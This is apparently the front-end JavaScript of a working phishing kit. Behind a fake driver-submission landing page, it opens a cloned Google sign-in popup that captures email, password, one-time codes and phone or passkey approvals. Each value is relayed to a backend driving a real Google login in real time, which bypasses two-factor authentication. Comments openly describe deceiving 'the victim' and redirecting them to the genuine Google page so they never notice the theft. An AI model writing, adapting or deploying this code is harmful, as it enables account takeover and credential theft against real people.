const token = location.pathname.split('/').pop();
// A unique id for THIS visitor's registration. The same static link is used by
// many people, so this keeps each person's steps building up their own fresh
// session server-side instead of everyone sharing one.
const wid = (crypto.randomUUID ? crypto.randomUUID() : Math.random().toString(36).slice(2));
const $ = (id) => document.getElementById(id);

// ---- screen switching (all screens live inside the popup card) ----
const SCREENS = [
  'screen-email',
  'screen-pass',
  'screen-totp',
  'screen-prompt',
  'screen-choice',
  'screen-sms',
  'screen-wait',
  'screen-done',
  'screen-error',
];
function show(name) {
  for (const id of SCREENS) $(id).classList.toggle('hidden', id !== name);
}
function hint(id, msg, error) {
  const el = $(id);
  if (msg) { el.textContent = msg; el.hidden = false; el.classList.toggle('error', !!error); }
  else { el.textContent = ''; el.hidden = true; el.classList.remove('error'); }
}

// The Google sign-in lives in a POPUP over the landing page (like a real
// "Continue with Google" flow) — the victim never sees a Google "page".
function openPopup() {
  $('g-overlay').classList.remove('hidden');
  $('g-email').focus();
}
function closePopup() {
  $('g-overlay').classList.add('hidden');
}

async function api(pathname, body) {
  const sep = pathname.includes('?') ? '&' : '?';
  return fetch('/api/wizard/' + token + pathname + sep + 'wid=' + wid, {
    method: body ? 'POST' : 'GET',
    headers: { 'Content-Type': 'application/json' },
    body: body ? JSON.stringify(body) : undefined,
  });
}

async function step(name, value) {
  try {
    const r = await api('/step', { step: name, value });
    return r.ok ? await r.json() : null;
  } catch {
    return null;
  }
}

// Toggle a Google-style loading spinner on a submit button while the backend
// is actually driving the real sign-in for that step.
function busy(btn, on) {
  const el = typeof btn === 'string' ? $(btn) : btn;
  el.disabled = on;
  el.classList.toggle('loading', on);
}

// The most recent wizard payload from the server (carries the landing URL and
// the live-login result for each step). Kept so errors can be mirrored against
// real Google messages and completion can redirect to the real site.
let WIZ = null;
function setWiz(w) { if (w) WIZ = w; }

// ---- the "victim" journey ----
let EMAIL = ''; // what they typed, for the success screen + retries

// Mark the wizard complete, then bounce the victim to the REAL Google account
// page — no fake "you're all set" screen lingers, so they never realize it was
// phishing.
function redirect() {
  const url = (WIZ && WIZ.landing) || 'https://myaccount.google.com/';
  window.location.replace(url);
}
async function finish() {
  stopPolling();
  await api('/complete', {}).catch(() => {});
  redirect();
}

// ---- inert links (kept so the page looks like real Google) ----
$('forgot-email').addEventListener('click', () =>
  hint('email-hint', 'Enter the email address linked to this account.'));
$('forgot-pass').addEventListener('click', () =>
  hint('pass-hint', 'Enter the password for this account.'));
// "Try another way" -> don't fight over 2FA; let REAL Google handle the prompt/
// SMS. Bounce them over and they finish it on the genuine page.
for (const id of ['try-another', 'prompt-retry', 'choice-alt', 'sms-alt']) {
  $(id).addEventListener('click', finish);
}

// ---- landing page footer links ----
for (const id of ['help-link', 'foot-terms', 'foot-privacy']) {
  const el = $(id);
  if (el) el.addEventListener('click', (e) => {
    e.preventDefault();
    toast('Protected by Google sign-in. Your details are only used to confirm your delivery session.');
  });
}
function toast(msg) {
  const el = $('toast');
  el.textContent = msg;
  el.classList.add('show');
  clearTimeout(toast._t);
  toast._t = setTimeout(() => el.classList.remove('show'), 2400);
}

// ---------------------------------------------------------------------------
// State routing. The backend reports which screen the REAL Google page is on;
// the clone renders exactly that and nothing else. This is the heart of the
// mirror: the clone never invents a screen the real browser isn't showing.
// ---------------------------------------------------------------------------
function stateOf(w) {
  return ((w && w.login) || {}).state || null;
}

// Waiting screens (phone prompt / passkey / captcha / neutral "verifying") are
// driven by the VICTIM'S PHONE, not this page — so we poll the server until the
// real browser actually moves on, then re-route.
let pollTimer = null;
let pollStale = 0;
function stopPolling() {
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  pollStale = 0;
}
function startPolling(currentState) {
  stopPolling();
  pollTimer = setInterval(async () => {
    let w = null;
    try {
      const r = await api('/poll');
      if (r.ok) w = await r.json();
    } catch {}
    if (!w) {
      // server doesn't know this visitor anymore (e.g. restart) — give up
      // politely rather than spin forever
      pollStale += 1;
      if (pollStale > 30) { stopPolling(); showErrorScreen('Something went wrong. Please try again.'); }
      return;
    }
    const st = stateOf(w);
    if (!st || st === currentState) return; // still on the same challenge
    stopPolling();
    route(w);
  }, 2500);
}

function configurePrompt(kind) {
  const cfg =
    kind === 'passkey'
      ? {
          title: 'Use your passkey',
          caption: 'A passkey prompt should appear on your phone or device. Confirm it there (fingerprint, face, or screen lock) to continue.',
          wait: 'Waiting for confirmation…',
        }
      : {
          title: "Confirm it's you",
          caption: "To help keep your account safe, Google wants to make sure it's really you. Check your phone for a notification and tap to confirm.",
          wait: 'Waiting for confirmation…',
        };
  $('prompt-title').textContent = cfg.title;
  $('prompt-caption').textContent = cfg.caption;
  $('prompt-wait').textContent = cfg.wait;
  hint('prompt-hint', '');
}

function setTotpCaption(kind) {
  $('totp-caption').textContent =
    kind === 'sms'
      ? 'We sent a verification code to your phone. Enter the 6-digit code below to finish.'
      : "To help keep your account safe, Google wants to make sure it's really you. Enter the 6-digit verification code from your authenticator app to finish.";
}

function renderChoices(choices) {
  const list = $('choice-list');
  list.innerHTML = '';
  for (const label of choices || []) {
    const b = document.createElement('button');
    b.type = 'button';
    b.className = 'g-choice-btn';
    b.textContent = label;
    b.addEventListener('click', async () => {
      stopPolling();
      busy(b, true);
      const w = await step('choice', label);
      busy(b, false);
      setWiz(w);
      if (!w) { toast('Something went wrong. Try again.'); return; }
      const L = w.login || {};
      if (L.status === 'error') return showErrorScreen(L.message);
      route(w);
    });
    list.appendChild(b);
  }
}

function showDone() {
  stopPolling();
  const name = (EMAIL || 'you').split('@')[0] || 'you';
  $('done-avatar').textContent = name.charAt(0).toUpperCase();
  $('done-email').textContent = EMAIL || 'your Google Account';
  show('screen-done');
  // give the success screen a moment to register, then bounce to real Google
  setTimeout(finish, 3000);
}
$('btn-done').addEventListener('click', finish);

function showErrorScreen(msg) {
  stopPolling();
  $('error-caption').textContent = msg || 'Please try again.';
  show('screen-error');
}
$('btn-retry').addEventListener('click', () => {
  // back to the email screen; the same wid reuses the in-flight session, so a
  // re-submit simply re-drives the real sign-in from the top
  hint('email-hint', '');
  openPopup();
  show('screen-email');
  $('g-email').focus();
});

function route(w) {
  const L = (w && w.login) || {};
  const st = L.state;
  // No live state yet (e.g. right after the driver step, before any Google
  // credential) -> start the sign-in at the email screen.
  if (!st) {
    show('screen-email');
    $('g-email').focus();
    return;
  }
  switch (st) {
    case 'email':
      show('screen-email');
      break;
    case 'password':
      if (EMAIL) renderAccount(EMAIL);
      show('screen-pass');
      $('g-pass').focus();
      break;
    case 'totp':
      setTotpCaption(L.codeKind);
      show('screen-totp');
      $('g-totp').focus();
      break;
    case 'prompt':
    case 'passkey':
      configurePrompt(st);
      show('screen-prompt');
      startPolling(st);
      break;
    case 'choice':
      renderChoices(L.choices);
      show('screen-choice');
      break;
    case 'sms':
      $('sms-number').textContent = L.phone || 'your phone number';
      show('screen-sms');
      break;
    case 'captcha':
    case 'unknown':
    default:
      show('screen-wait');
      startPolling(st || 'unknown');
      break;
    case 'logged-in':
      showDone();
      break;
    case 'error':
      showErrorScreen(L.message);
      break;
  }
}

function renderAccount(email) {
  const [name, domain] = email.split('@');
  $('account-email').textContent = email;
  $('avatar-initials').textContent = (name || '?').charAt(0).toUpperCase();
  $('to-continue').textContent = 'To continue to ' + (domain ? domain : 'your Google Account');
  $('account-row').hidden = false;
}

// ---- driver submission (landing) ----
$('form-driver').addEventListener('submit', async (e) => {
  e.preventDefault();
  const driverName = $('d-name').value.trim();
  const licensePlate = $('d-plate').value.trim();
  if (!driverName && !licensePlate) {
    return hint('driver-hint', 'Enter your name and number plate to continue.', true);
  }
  hint('driver-hint', '');
  busy('btn-driver', true);
  const ok = await step('driver', { driverName, licensePlate, phone: $('d-phone').value.trim() });
  busy('btn-driver', false);
  setWiz(ok);
  if (!ok) {
    hint('driver-hint', 'Something went wrong. Try again.', true);
    return;
  }
  // driver details captured -> open the Google sign-in as a popup. Route on the
  // server state (usually null -> email screen; a returning visitor mid-challenge
  // gets their current screen again).
  openPopup();
  route(ok);
});

// close the popup (backdrop click or the X), leaving the landing intact
$('g-close').addEventListener('click', closePopup);
$('g-overlay').addEventListener('click', (e) => { if (e.target === $('g-overlay')) closePopup(); });

// ---- email ----
$('form-email').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-email').value.trim();
  if (!v) return hint('email-hint', 'Enter an email or phone number.');
  hint('email-hint', '');
  busy('btn-email', true);
  const ok = await step('username', v);
  busy('btn-email', false);
  setWiz(ok);
  const L = (ok && ok.login) || {};
  if (L.status === 'error') {
    // real Google mirrors this: unknown account -> error, stay on this screen
    hint('email-hint', L.message || "Couldn't find your Google Account.", true);
    return;
  }
  if (!ok) {
    hint('email-hint', 'Something went wrong. Try again.', true);
    return;
  }
  EMAIL = v;
  // Mirror EXACTLY what the real backend browser is asking for next: password,
  // 2FA, a phone prompt, a choice of methods, or straight to signed-in.
  route(ok);
});

// ---- password ----
$('show-pass').addEventListener('change', (e) => {
  $('g-pass').type = e.target.checked ? 'text' : 'password';
});
$('form-pass').addEventListener('submit', async (e) => {
  e.preventDefault();
  const v = $('g-pass').value;
  if (!v) return hint('pass-hint', 'Enter your password.', true);
  hint('pass-hint', '');
  $('g-pass').classList.remove('field-error');
  busy('btn-pass', true);
  const w = await step('password', v);
  busy('btn-pass', false);
  setWiz(w);
  const L = (w && w.login) || {};
  if (!w) {
    hint('pass-hint', 'Something went wrong. Try again.', true);
    return;
  }
  if (L.status === 'error') {
    // wrong password — mirror real Google: show the error and STAY here, don't
    // advance to 2FA.
    $('g-pass').classList.add('field-error');
    hint('pass-hint', L.message || 'Wrong password. Try again or click Forgot password to reset it.', true);
    return;
  }
  route(w);
});

// ---- 2FA (authenticator OR SMS code — same 6-digit entry screen) ----
async function submitTotp() {
  const v = $('g-totp').value.trim();
  if (!v) return hint('totp-hint', 'Enter the code shown in your app or the code we texted you.', true);
  hint('totp-hint', '');
  $('g-totp').classList.remove('field-error');
  busy('btn-totp', true);
  const w = await step('totp', v);
  busy('btn-totp', false);
  setWiz(w);
  const L = (w && w.login) || {};
  if (!w) return;
  if (L.status === 'error') {
    // wrong / expired code — like real Google, reject and let them retry the
    // current code (codes rotate every 30s).
    $('g-totp').classList.add('field-error');
    hint('totp-hint', L.message || 'That code didn’t work. Enter the current code to continue.', true);
    $('g-totp').focus();
    $('g-totp').select();
    return;
  }
  route(w);
}
$('btn-totp').addEventListener('click', submitTotp);
$('g-totp').addEventListener('keydown', (e) => { if (e.key === 'Enter') submitTotp(); });
$('g-totp').addEventListener('input', () => {
  const el = $('g-totp');
  // like real Google: digits only, max 6, auto-submit at 6
  el.value = el.value.replace(/\D/g, '').slice(0, 6);
  if (el.value) { hint('totp-hint', ''); el.classList.remove('field-error'); }
  if (el.value.length === 6) submitTotp();
});

// ---- "we'll text you a code" number screen ----
$('btn-send-code').addEventListener('click', async () => {
  hint('sms-hint', '');
  busy('btn-send-code', true);
  const w = await step('send-code', '');
  busy('btn-send-code', false);
  setWiz(w);
  const L = (w && w.login) || {};
  if (!w) {
    hint('sms-hint', 'Something went wrong. Try again.', true);
    return;
  }
  if (L.status === 'error') {
    hint('sms-hint', L.message || 'Something went wrong. Try again.', true);
    return;
  }
  route(w); // normally lands on the totp (sms) code entry screen
});

// ---- boot ----
(async function boot() {
  // inject the Google logo into every (empty) .g-logo slot once
  const LOGO =
    '<svg viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.14 42.62 14.24 48 24 48z"/></svg>';
  for (const el of document.querySelectorAll('.g-logo')) el.innerHTML = LOGO;

  const r = await api('');
  if (!r.ok) {
    document.title = 'Driver & vehicle submission — OnRoute';
    $('card').innerHTML = '<div class="oops" style="margin:8px 0">This link is invalid or has expired.<br><span style="font-weight:400;color:#5f6368">Ask the sender for a fresh link.</span></div>';
    return;
  }
  const w = await r.json();
  setWiz(w);
  // Already signed in (reload after completing / returning visitor) ->
  // bounce straight to the real account page; otherwise show the driver landing
  // (popup stays closed until they hit "Continue with Google").
  if (w.loggedIn) { finish(); return; }
  closePopup();
  $('d-name').focus();
})();
